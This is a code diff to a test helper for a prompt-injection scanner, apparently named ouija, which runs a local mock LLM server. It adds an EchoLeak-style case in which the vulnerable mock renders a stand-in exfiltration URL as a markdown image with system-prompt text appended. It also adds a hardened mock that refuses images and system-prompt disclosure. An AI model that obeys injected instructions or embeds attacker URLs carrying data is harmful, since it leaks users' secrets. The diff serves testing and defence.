@@ -13,14 +13,28 @@ a real prompt-injection-vulnerable application.
 from __future__ import annotations
 
 import json
+import re
 import socket
 import threading
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+# Matches the synthetic exfil canary URL ouija plants:
+#   http://ouija-exfil.<token>.invalid/c?d=
+_CANARY_URL_RE = re.compile(r"http://ouija-exfil\.[0-9a-f]+\.invalid/c\?d=")
 
 
 def _vulnerable_reply(prompt: str) -> str:
     """Simulate a model that obeys injected instructions."""
     lowered = prompt.lower()
+    # EchoLeak class: a vulnerable model faithfully renders the attacker's
+    # exfil canary URL into a markdown image with sensitive data appended.
+    match = _CANARY_URL_RE.search(prompt)
+    if match:
+        canary_url = match.group(0)
+        return (
+            "Sure, here is your status badge:\n"
+            f"![status]({canary_url}You%20are%20a%20helpful%20assistant)"
+        )
     # If the prompt tells it to print a marker, it obeys (vulnerable).
     if "ouija_injection_confirmed" in lowered:
         return "Sure! OUIJA_INJECTION_CONFIRMED — happy to help."
@@ -47,36 +61,61 @@ def _vulnerable_reply(prompt: str) -> str:
     return "I am a friendly assistant. How can I help you today?"
 
 
-class _Handler(BaseHTTPRequestHandler):
-    def log_message(self, *args):  # silence test noise
-        pass
+def _safe_reply(prompt: str) -> str:
+    """Simulate a hardened model that ignores injected/exfil instructions.
 
-    def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(length) if length else b"{}"
-        try:
-            prompt = json.loads(body or b"{}").get("prompt", "")
-        except json.JSONDecodeError:
-            prompt = ""
-        reply = _vulnerable_reply(prompt)
-        payload = json.dumps({"reply": reply}).encode("utf-8")
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(payload)))
-        self.end_headers()
-        self.wfile.write(payload)
+    It never echoes a marker, never leaks config, and — critically for the
+    EchoLeak test — never renders the attacker's canary URL, even when asked.
+    """
+    return (
+        "I can't include external images or tracking links, and I won't reveal "
+        "my system prompt. How can I help you with your request?"
+    )
+
+
+def _make_handler(reply_fn):
+    class _Handler(BaseHTTPRequestHandler):
+        def log_message(self, *args):  # silence test noise
+            pass
+
+        def do_POST(self):
+            length = int(self.headers.get("Content-Length", 0))
+            body = self.rfile.read(length) if length else b"{}"
+            try:
+                prompt = json.loads(body or b"{}").get("prompt", "")
+            except json.JSONDecodeError:
+                prompt = ""
+            reply = reply_fn(prompt)
+            payload = json.dumps({"reply": reply}).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(payload)))
+            self.end_headers()
+            self.wfile.write(payload)
+
+    return _Handler
 
 
 class MockLLM:
-    """Context-managed mock server bound to an ephemeral port on 127.0.0.1."""
+    """Context-managed mock server bound to an ephemeral port on 127.0.0.1.
 
-    def __init__(self) -> None:
+    Args:
+        safe: when False (default) the mock is deliberately vulnerable — it obeys
+            injected markers and renders the exfil canary. When True it models a
+            hardened endpoint that refuses every probe (used to assert ouija does
+            not false-positive on well-behaved targets).
+    """
+
+    def __init__(self, safe: bool = False) -> None:
         # Pick an ephemeral port explicitly, then hand it to the HTTP server.
         probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         probe.bind(("", 0))
         self.port = probe.getsockname()[1]
         probe.close()
-        self._server = ThreadingHTTPServer(("127.0.0.1", self.port), _Handler)
+        reply_fn = _safe_reply if safe else _vulnerable_reply
+        self._server = ThreadingHTTPServer(
+            ("127.0.0.1", self.port), _make_handler(reply_fn)
+        )
         self._thread: threading.Thread | None = None
 
     @property
